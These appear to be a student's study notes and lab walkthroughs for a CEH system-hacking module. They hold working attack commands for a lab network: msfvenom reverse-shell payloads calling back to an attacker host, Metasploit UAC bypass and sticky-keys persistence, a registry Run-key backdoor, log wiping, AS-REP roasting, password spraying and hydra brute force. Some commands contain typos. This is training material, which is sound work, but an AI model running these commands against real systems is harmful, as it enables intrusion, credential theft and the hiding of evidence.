2025-07-26 22:19

Status:

Tags:

# System  Hacking ( Concepts )


### Gaining Access

#### Cracking Passwords
-  Microsoft Authentication

- How Hash Passwords Are Stored in Windows SAM?
Windows OSs use a Security Account Manager (SAM) database file to store user passwords. The SAM file is stored at %SystemRoot%\system32\config\SAM in Windows systems, and Windows mounts it in the registry under the HKEY_LOCAL_MACHINE\SAM registry hive. It stores LM or NTLM hashed passwords.

##### Tools to Extract the Password Hashes 
- Tools used for Hashes carking 
	- pwdump7
	-  Mimikatz (https://github.com) 
	- DSInternals (https://github.com)
	- hashcat (https://hashcat.net) 
	- PyCrack (https://github.com)

##### NTLM Authentication Process
NTLM includes three methods of challenge–response authentication: LM, NTLMv1, and NTLMv2, all of which use the same technique for authentication. The only difference between them is the level of encryption. In NTLM authentication, the client and server negotiate an authentication protocol. This is accomplished through the Microsoft-negotiated Security Support Provider (SSP).

![[Pasted image 20250726223007.png]]
##### Kerberos Authentication
Kerberos is a network authentication protocol that provides strong authentication for client/server applications through secret-key cryptography, which provides mutual authentication. Both the server and the user verify each other’s identity. Messages sent through this protocol are protected against replay attacks and eavesdropping.

![[Pasted image 20250726223242.png]]


##### Password Cracking 

###### Types of Password Attacks 
- Non-Electronic Attacks
- Active Online Attacks: 
-  Passive Online Attacks: 
-  Offline Attacks:

###### Non-Electronic Attacks
-  Social Engineering
-  Shoulder Surfing
- Dumpster Diving 

##### Active Online Attacks
-  Dictionary Attack
- Brute-Force Attack

-  Perform Dictionary and Brute-Force Attack

######  Password Spraying Attack
 certain number of attempts before their accounts are locked. Attackers initially attempt a single commonly used password on multiple accounts simultaneously and wait for the response before initiating another password attempt on the same accounts. They continue this process while remaining under the lockout threshold so that they can try a large number of passwords without being affected by automatic lockout mechanisms. Password spraying can be performed at different stages through common ports such as MSSQL (1433/TCP), SSH (22/TCP), FTP (21/TCP), SMB (445/TCP), Telnet (23/TCP), and Kerberos (88/TCP).

- Attackers use tools such as thc-hydra to perform password spraying attacks. o
	- thc-hydra 
	-  Metasploit (https://www.metasploit.com) 
	- Rubeus (https://github.com) 
	- adfsbrute (https://github.com) 
	- CrackMapExec (https://github.com)

######  Mask Attack
Mask attack is similar to brute-force attacks but recovers passwords from hashes with a more specific set of characters based on information known to the attacker. Brute-force attacks are time-consuming because the attacker tries all possible combinations of characters to crack the password. In contrast, in a mask attack, the attacker uses a pattern of the password to narrow down the list of possible passwords and reduce the cracking time. 

- hashcat

###### Password Guessing

Manual Password-Cracking Algorithm

Default Passwords

The following are some of the online tools to search default passwords: 
o https://www.fortypoundhead.com 
o https://cirt.net 
o https://www.routerpasswords.com
o https://default-password.info
o https://192-168-1-1ip.mobi

######  Trojans/Spyware/Keyloggers
![[Pasted image 20250726225711.png]]

######  Hash Injection/Pass-the-Hash (PtH) Attack

This type of attack is possible when the target system uses a hash function as part of the authentication process to authenticate its users. Generally, the system stores hash values of the credentials in the SAM database/file on a Windows computer. In such cases, the server computes the hash value of the user-submitted credentials or allows the user to input the hash value directly. The server then checks it against the stored hash value for authentication.
![[Pasted image 20250726225827.png]]
######  LLMNR/NBT-NS Poisoning
LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are two main elements of Windows OSs used to perform name resolution for hosts present on the same link. These services are enabled by default in Windows OSs.

![[Pasted image 20250726225956.png]]

###### LLMNR/NBT-NS Poisoning Tools ## imp

###### NTLM hash cracking 
###### Responder 
- To run responder 
	- command 
		- ``sudo responder -I eth0``
-  open run in windows  11 n
	-   The **Run** window appears; type **\\CEH-Tool**
- copy NTLM  hash 
- and past it in hash.txt 
- use john hash.txt  to crack hash

######  Internal Monologue Attack
![[Pasted image 20250726232750.png]]

######  Cracking Kerberos Password

###### AS-REP Roasting (Cracking TGT)
![[Pasted image 20250726232938.png]]

##### Other Active Online Attacks
-  Combinator Attack 
-  Fingerprint Attack
- PRINCE Attack
- Toggle-Case Attack
-  Markov-Chain Attack
- GPU-based Attack

##### Passive Online Attacks 
###### Wire Sniffing 
Packet sniffing is a form of wire sniffing or wiretapping in which hackers sniff credentials during transit by capturing Internet packets. Attackers rarely use sniffers to perform this type of attack. With packet sniffing, an attacker can gain passwords to applications such as email, websites, SMB, FTP, rlogin sessions, or SQL. As sniffers run in the background, the victim remains unaware of the sniffing.
![[Pasted image 20250726233704.png]]
######  Man-in-the-Middle/Manipulator-in-the-Middle and Replay Attacks
![[Pasted image 20250726233729.png]]

##### Offline Attacks
Offline attacks occur when an attacker checks the validity of passwords. The attacker observes how the password is stored. If the usernames and passwords are stored in a readable file, it is easy for the attacker to gain access to the system. Hence, it is important to protect the list of passwords and keep it in an unreadable form, preferably encrypted.

- Two examples of offline attacks are as follows: 
	1. Rainbow table attack 
	2. Distributed Network Attack

#####  Distributed Network Attack 
A Distributed Network Attack (DNA) is a technique used for recovering password-protected files that utilize the unused processing power of machines spread across the network to decrypt passwords. In this attack, the attacker installs a DNA manager in a central location where machines running DNA clients can access it over a network. The DNA manager coordinates the attack and assigns small portions of the key search to machines distributed throughout the network. The DNA client runs in the background, only taking the processor time that was unused. The program combines the processing capabilities of all the clients connected to the network and uses it to crack the password. Attackers use the Exterro Password Recovery Toolkit (PRTK), which is equipped with DNA tools, to perform this attack.

##### Password Recovery Tools
Password recovery tools allow attackers to break complex passwords, recover strong encryption keys, and unlock several documents. 
- Elcomsoft Distributed Password Recovery
-  Passware Kit Forensic (https://www.passware.com) 
- hashcat (https://hashcat.net) 
- PCUnlocker (https://www.top-password.com) 
- Lazesoft Recover My Password (https://www.lazesoft.com) 
- Passper WinSenior (https://passper.imyfone.com)

##### Password-Cracking Tools
- Some password-cracking tools are listed as follows. 
	- L0phtCrack
	-  THC-Hydra
	-  RainbowCrack
	-  hashID (https://pypi.org) 
	- Patator (https://github.com) 
	- brutus (https://github.com) 
	- BruteX (https://github.com) 
	- Secure Shell Bruteforcer (https://github.com)
##### Password Salting 
![[Pasted image 20250726234526.png]]


##### Tools to Detect LLMNR/NBT-NS Poisoning 
 -  to detect LLMNR/NBT-NS poisoning attacks.  use tools such as 
	 - Vindicate
	 - got-responded
	 -  Respounder

#### Vulnerability Exploitation 
- Steps involved in exploiting vulnerabilities: 
	1. Identify the Vulnerability
	2.  Determine the Risk Associated with the Vulnerability 
	3. Determine the Capability of the Vulnerability
	4. Develop the Exploit
	5.  Select the Method for Delivering – Local or Remote
	6. Generate and Deliver the Payload
	7. Gain Remote Access
##### Exploit Sites
Exploit sites such as Exploit-DB VulDB are invaluable resources during the vulnerability exploitation phase of hacking. Attackers can use these sites to discover vulnerabilities and download or develop exploits to perform remote exploitation on the target system. These sites include details of the latest vulnerabilities and exploits. 

- Discussed below are various exploit sites: 
	- Exploit Database
	-  VulDB
	- OSV
	-  MITRE CVE

##### Windows Exploit Suggester - Next Generation (WES-NG)
indows Exploit Suggester - Next Generation (WES-NG) is a Python-based tool that allows attackers to discover exploits for existing vulnerabilities in Windows OS. It compares the output of the systeminfo.exe utility with a database containing the latest vulnerabilities to list out the existing CVEs of vulnerabilities and suggest the exploits

ploits in a target Windows system using the WES-NG tool


##### Metasploit Framework 

##### AI-Powered Vulnerability Exploitation Tools
- Nebula
- DeepExploit

##### Buffer Overflow
A buffer is an area of adjacent memory locations allocated to a program or application to handle its runtime data. Buffer overflow or overrun is a common vulnerability in applications or programs that accept more data than the allocated buffer. This vulnerability allows the application to exceed the buffer while writing data to the buffer and overwrite neighboring memory locations. Furthermore, this vulnerability leads to erratic system behavior, system crash, memory access errors, etc. Attackers exploit a buffer overflow vulnerability to inject malicious code into the buffer to damage files, modify program data, access critical information, escalate privileges, gain shell access, and so on

##### Domain Mapping and Exploitation with Bloodhound 
D domain mapping provides the overall architecture of an AD domain’s structure in an organization in a graphical user interface (GUI) format and shows the trust relationship between domain users and groups in an AD environment. Attackers attempt to identify a complex attack path in the target organization’s AD environment using tools such as BloodHound and Docusnap. Security professionals can also use the same tools to identify and eliminate attack paths before they are exploited

###### Bloodhound
Bloodhound is a JavaScript web application that is built on top of Linkurious and compiled using Electron, with a Neo4j database fed by a C# data collector. It uses graph theory to reveal hidden and often unintended relationships within an AD environment. Attackers use BloodHound to easily identify complex attack paths in AD environments.
##### Post AD Enumeration using PowerView 
Attackers perform Active Directory (AD) enumeration to extract sensitive information such as users, groups, domains, and other resources from the target AD environment. Attackers enumerate AD using PowerShell tools such PowerView.

#### Maintaining Access
 After gaining access and escalating privileges on the target system, now attackers try to maintain their access for further exploitation of the target system or make the compromised system a launchpad from which to attack other systems in the network. Attackers remotely execute malicious applications such as keyloggers, spyware, and other malicious programs



##### Executing Applications
The malicious programs attackers execute on target systems can be: ▪ Backdoors: Program designed to deny or disrupt the operation, gather information that leads to exploitation or loss of privacy, or gain unauthorized access to system resources.
- Crackers: Components of software or programs designed for cracking a code or passwords.
- Keyloggers: These can be hardware or software. In either case, the objective is to record each keystroke made on the computer keyboard.
- Spyware: Spy software may capture screenshots and send them to a specified location defined by the hacker. For this purpose, attackers have to maintain access to victims’ computers. After deriving all the requisite information from the victim’s computer, the attacker installs several backdoors to maintain easy access to it in the future.

##### Tools for Executing Applications 
- tools such as
	-  Dameware Remote Support
	-  Ninja (https://github.com) 
	- Pupy (https://github.com) 
	- PDQ Deploy (https://www.pdq.com) 
	- ManageEngine Endpoint Central (https://www.manageengine.com) 
	- PsExec (https://www.microsoft.com)
##### Keylogger 
Keyloggers are software programs or hardware devices that record the keys struck on the computer keyboard (also called keystroke logging) of an individual computer user or a network of computers. 

![[Pasted image 20250730201723.png]]


##### Types of Keystroke Loggers 
![[Pasted image 20250730201850.png]]


##### Remote Keylogger Attack Using Metasploit
On the exploited Windows machine, attackers establish a Meterpreter session and perform the following steps.

- check process running 
	- `` ps``
	- `` getpid``
- change the current pid to running pid 
	- ``migrate <PID> `` example :exploer.exe 
		- `` migrate 5400``
 -  to initiate the actual keylogging process on the target system.
	 - ``Keyscan_start ``
- to  dumps all the sniffed keystrokes and displays them on the console
	- `` keyscan_dump``
-  command to stop sniffing keystrokes.
	- `` keyscan_stop``
- ttackers can also automate the entire sniffing and data dumping process using the Metasploit
	- ``lockout_keylogger``

##### Keyloggers for Windows

#####  Spyrix Personal Monitor
x Personal Monitor is used for remote monitoring on a computer that includes recording of keystrokes, passwords, and screenshots. This keylogger is perfectly hidden from antivirus, anti-rootkit, and anti-spyware software.



#### Privilege Escalation Using Misconfigured NFS
1.  check whether the NFS service is running on the target host. (port: 2049)
	- ``nmap -sV <ip> ``
2. command to install NFS and interact with the target NFS service: 
	- `` sudo apt-get install nfs-common``
	- ``showmount -e <IP>  ``
3.  command returns any mountable directories, create a directory named nfs
	-  ``mkdir /tmp/nfs``
4. command to mount the nfs directory on the target host.
	- ``sudo mount -t nfs <IP>:/<Share Directory> /tmp/nfs ``
5.  commands to view the details of the mounted directory and obtain the group ownership to the share directory. 
	- `` cd /tmp/nfs `` 
	- ``sudo cp /bin/bash`` 
	- ``ls -la``
6.  command to establish a remote connection with the target host using SSH: 
	-  ``ssh -l <Target Login Name> <Target IP Address>
 ``




#  LAB - 1 

## windows exp

## Task 1 -Perform Active Online Attack to Crack the System's Password using Responder

1. `` Run sudo responder -I eth0`` on parrot 
2. then run in windows machine 
	- ``  Run -> \\CEH-Toolsin the Open field and click OK``
3. capture the hash and save it in .txt file 
4. run `` john hash.txt
5. will get the password 
## Task 2: Gain Access to a Remote System using Reverse Shell Generator

1.  command to start Reverse Shell Generator.
	- ``docker run -d -p 80:80 reverse_shell_generator  ``
	- open firefox and go  http://localhost
	- set ip and port number 
2. create payload using msfvenom option present in the reverse shell generator tool
	-  **Copy** button to copy the MSFVenom code.
	- ``  msfvenom -p windows/meterpreter/reverse_tcp Ihost=10.10.1.13 Iport=444 -f exe › /home/attacker/Desktop/Windows.exeason)``
3. We will start a listener using Reverse Shell Generator
	- `` msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.1.13; set port 4444; exploit "exploit"/meterp``

## Task 3: Perform Buffer Overflow Attack to Gain Access to a Remote System
- skipped 
# Lab 2: Perform Privilege Escalation to Gain Higher Privileges

## Task 1: Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
1. create payload 
	- ``msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe. ``
2. payload delivery or Copy the payload into the shared folder
	- use python server 
	- ``  python3 -m http.server 70"
3. use listener Metasploit
	- ``set payload windows/meterpreter/reverse_tcp``
	- ``set LHOST ``
	- ``set LPORT ``
4. on windows machine 
	- use browser and download payload 
	-  on ``http://10.10.1.13:port``
	- run payload 
	- The Meterpreter session has successfully been opened
	- type `` sysinfo`` to get system information
	-   type ``getuid`` to display current user ID.
	- Type ``background`` and press **Enter**, to background the current session.
5. BypassUAC
	- `` use exploit/windows/local/bypassuac_fodhelper``
	- `set session 1``
	- ``set TARGET 0``
	- ``exploit``
	-  The BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine.
	- ``getsystem -t 1``
	- ``getuid``
	- The meterpreter session is now running with system privileges.
6.  maintain persistence by exploiting sticky_keys 
	 - we will use sticky_keys module present in Metasploit to exploit the sticky keys feature in **Windows 11**.
	 - ``use post/windows/manage/sticky_keys``
	- ``set session 2``
	- ``exploit``
	-  Martin is a user account without any admin privileges, lock the system and from the lock screen press **Shift** key **5** times, this will open a command prompt on the lock screen with System privileges instead of sticky keys error window.

- other modules that cat be use for  
	- ``use exploit/windows/local/bypassuac_ vwr ``
	- ``use exploit/windows/local/bypassuac_comhijack``
	- ``use exploit/windows/local/bypassuac_fodhelper
	- ``use exploit/windows/local/bypassuac_injection``
	- ``use exploit/windows/local/bypassuac``

	-  Screenshot of Metasploit showing dump of password hashes
		- command 
			- ``run post/windows/gather/smart_hashdump``
# Lab 3: Maintain Remote Access and Hide Malicious Activities
## Task 1: User System Monitoring and Surveillance using Spyrix
- open Windows Server 2022
1. cd ``Z:\CEHv13 Module 06 System Hacking\Spyware\General Spyware\Spyrix and double-click spm_setup.exe``
2. then follow the lab manual 
## Task 2: Maintain Persistence by Modifying Registry Run Keys
- 
1.    get acess 
2. for bypass uac use this module 
	- ``use exploit/windows/local/bypassuac_silentcleanup ``
3. get elevate privileges
	- ``getsystem -t 1``
4. open shell and type 
	- ``reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"`` `#filename.exe`

# Lab 4: Clear Logs to Hide the Evidence of Compromise

## Task 1: Clear Windows Machine Logs using Various Utilities

1. open windows 11 machine navigate to 
	- ``E:\CEH-Tools\CEHv13 Module 06 System Hacking\Covering Tracks``
		- run file  as administrator
		- ``Clear_Event_Viewer_Logs.bat``
2. using wevtutil 
	 - open cmd as administrator
		-   command to display a list of event logs.
			- ``wevtutil el``
				-   lists event log names.
				- `` el | enum-logs``
	- command to clear log as
		- ``wevtutil cl [log_name]``
		- ``wevtutil cl system ``
	  - Similarly, you can also clear application and security logs by issuing the same command with different log names (**application, security**).
3. using cipher 
	- command to clear log using cipher 
	- ``cipher /w:[Drive or Folder or File Location]``
	- ``cipher /w:C:``


## Task 2: Clear Linux Machine Logs using the BASH Shell

1. clearing the Linux machine event logs using the BASH shell.
	-  open terminal in parrot 
	- command to disable the BASH shell from saving the history.
		-  ``export HISTSIZE=0``
	- command to clear the stored history.
		- `` histroy -c``
	- command to delete the history of the current shell
		- `` history -w`` 
2. using bash 
	- command to shred the history file, making its content unreadable.
		- ``shred ~/.bash_history``
	- command to view the shredded history content.
		- ``more ~/.bash_history``
3. You can use all the above-mentioned commands in a single command by issuing
	- ``shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit``
# Lab 5: Perform Active Directory (AD) Attacks Using Various Tools

## Task 1: Perform Initial Scans to Obtain Domain Controller IP and Domain Name
1. To perform initial scans on the domain controller (DC).
	- ``nmap 10.10.1.0/24``
	- Observe the nmap output carefully. Here, nmap shows that host **10.10.1.22** has **port** **88/TCP** **kerberos-sec** and **port 389/TCP LDAP** opened which confirms that our DC IP address is **10.10.1.22**.
2. we will scan **10.10.1.22** in more detail to obtain more information.
	- `` nmap -A -sS -sV 10.10.1.22``
3. we obtained the name which is ``CEH.com``
4.  DC IP and domain name, which can be used in the AS-REP Roasting attack.
## Task 2: Perform AS-REP Roasting Attack
An AS-REP roasting attack targets user accounts in AD that do not require Kerberos pre-authentication, exploiting the DONT_REQ_PREAUTH setting. Attackers can request a ticket-granting ticket (TGT) for these accounts without needing the user's password.

The DC responds with an encrypted TGT, which the attacker captures. This TGT, encrypted with the user's password hash, is then subjected to offline password-cracking tools such as Hashcat or John the Ripper. By rapidly guessing the password, the attacker can eventually decrypt the TGT, revealing the user's password.

(port 88 )
1. parrot run command  
	- `` cd  impacket/examples/ `` as  root 
	
 2. run this command 
	- ``python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22``
	- We can observe that the user **Joshua** has **DONT_REQUIRE_PREAUTH** set. As this user is vulnerable to AS-REP roasting, we obtain Joshua's password hash.
3. hash and save it as ``joshuahash.txt``.
4. crack   password hash using john 
	- ``john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt``
5. we got ``user: Joshua`` and ``password: cupcake`` 

## Task 3: Spray Cracked Password into Network using CrackMapExec.
Using CrackMapExec for password spraying involves leveraging its capabilities to automate the process. For instance, if "cupcake" is a cracked password, CME can be used to test this password against numerous user accounts and services across a network. This approach helps identify other accounts that may be using the same password, facilitating further penetration testing or security assessments.

-  we will be focusing on RDP. However, you can explore and check other services.
1. to perform password spraying.
	- `` cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"``  
2. the spray completion we find that user **Mark** is using the same password **cupcake** on host **10.10.1.40**. We will now try to connect to RDP as user **mark**.
	-  ``user:mark password:cupcake``
3. connecting RDP using  ``Remmina``
	- enter IP address ``10.10.1.40``
	- Enter RDP authentication credentials as
		- ``user:mark password:cupcake``
## Task 4: Perform Post-Enumeration using PowerView
PowerView is a PowerShell tool designed for network and AD enumeration. It helps security professionals gather detailed information about user accounts, groups, computers, and domain trusts. PowerView is used to identify potential security weaknesses and misconfigurations in an AD environment. It is commonly employed in penetration testing and red team operations.


1.  move into the ADtools folder.
	- ``cd /root/ADtools`` 
2. For enumeration purposes, we will utilize the **PowerView.ps1** script. We will host a Python server on our attacker machine to share this script, and then we will download it onto a Windows 11 machine (Mark) using an RDP session.
	- ``python3 -m http.server ``
3. After starting the HTTP server, return to Remmina where our RDP session is active. Then, open the **Firefox** browser and navigate to the URL **http://10.10.1.13:8000/PowerView.ps1** to automatically download the **PowerView.ps1** script. Close the **Firefox** browser window.
4. open powershell
	 -  `` cd Downloads``
	 - run  ``powershell -EP Bypass``
	 - ``. .\PowerView.ps1``
	 - This command will display all the information related to computers in AD. It lists all computer objects in AD
		 - ``Get-NetComputer``
		 - ``Get-NetGroup``
		 - `` Get-NetUser``
5.   During user enumeration, we found a new user **SQL_srv**, who has some high privileges and could be useful for further attacks. In the next task we will be attacking the **SQL_srv** user who has SQL service running on it.
## Task 5: Perform Attack on MSSQL service
**xp_cmdshell** is a SQL server stored procedure enabling command shell execution. Misconfigured xp_cmdshell can lead to arbitrary command execution, data exfiltration, and potential network compromise, posing significant security risks. Proper configuration and security measures are crucial to mitigate these risks.

1.  Nmap scan, we observed that host **10.10.1.30** (which is **Windows Server 2019 (AD)** virtual machine) has port **1433** open. We will attempt to brute force the password using **Hydra**, as we already know the username, which is **SQL_srv**.
2. **SQL_srv** in a text file and name it as **user.txt**
3. password  cracking using hyrda 
	- ``hydra -l SQL_SIV -P / root/ADtools/rockyou.txt 10.10.1.30 mssql``
	- `` user:SQL_SrV password:batman''
4.  we will attempt to log into the service using ``mssqlclient.py``
	- ``python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433 ``
	-  the database name, which is "**master**" here.
5. Execute the SQL query
	- ``SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';``
6. we know that **xp_cmdshell** is enabled on SQL server we can use Metasploit to exploit this service. Type **exit** and press **Enter**; then execute the command **msfconsole** to launch Metasploit.
	- ``exit``
7.  ``msconsole``
	- ``use exploit/windows/mssql/mssql_payload``
	- ``set RHOST 10.10.1.30``
	- ``set USERNAME SQL_srv``
	- ``set PASSWORD batman``
	``set DATABASE master``
 8. type `` shell``
	- ``whoami``
- Here, it is $sqlexpress which is the SQL service.

## Task 6: Perform Privilege Escalation
WinPEASx64.exe is a tool for Windows privilege escalation, identifying misconfigurations and vulnerabilities for potential exploitation.

1. 1. we will use WinPEAS.exe to enumerate any misconfigurations.
	- ``cdC:\Users\Public\Downloads``
	- run `` powershell``
2. we need to host winPEASx64.exe
	- in parrot ``cd /root/ADtools ``
3. type in powershell
	- ``wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe``
	- `` /winpeas.exe`
4. Once the execution is completed, observe the output. Here, we have a file named **file.exe** in **C:\Program Files\CEH Services** that is unquoted and can be exploited for privilege escalation.
	- `` msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe``
5. ``cd ../../.. ; cd "Program Files/CEH Services" ``
	- ``move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe``
- ``move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe``
- ``  nc -nvlp 8888*``




## Task 7: Perform Kerberoasting Attack

Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments. Kerberoasting is a method to extract ticket granting ticket (TGT) hashes from AD. Attackers target service accounts with associated Kerberos service principal names (SPNs). TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication.
### References
use exploit/multi/handler 
set payload windows/shell_reverse_tcp
set LHOST 10.10.1.13 
set LPORT 8888 run



CEH eng q2
ans
![[Pasted image 20250728142516.png]]

##  Steganography

### Whitespace Steganography (imp)
- Snow (refer 886 )
	- syntax 
		- `` snow [ -CQS ] [ -p passwd ] [ -l line-len ] [ -f file | -m message ] [ infile [ outfile ]] ``
- example :
	- ``snow -C-m "My swiss bank account number is 45367192746" -p "magic" readme.txt readme1.txt ``
	  
### Image Steganography (imp)
- Image Steganography Tools
	- OpenStego
- Some examples of image steganography tools are as follows: 
	- StegOnline (https://georgeom.net) 
	- Coagula (https://www.abc.se) 
	- SSuite Picsel (https://www.ssuitesoft.com) 
	- CryptaPix (https://www.briggsoft.com)

### Document Steganography Tools
-  StegoStick 
- Some examples of document steganography tools are listed as follows: 
	- StegJ (https://sourceforge.net) 
	- Office XML (https://www.irongeek.com) 
	- SNOW (https://darkside.com.au) 
	- Data Stash (https://www.skyjuicesoftware.com)

### Video Steganography 
- OmniHide Pro 
- Some examples of video steganography tools are as follows: 
	- RT Steganography (https://sourceforge.net) 
	- StegoStick (https://sourceforge.net)  
	- OpenPuff (https://embeddedsw.net) 
	- MSU StegoVideo (http://www.compression.ru)
### Steganography Detection Tools
 -  zsteg (supports only PNG and BMP )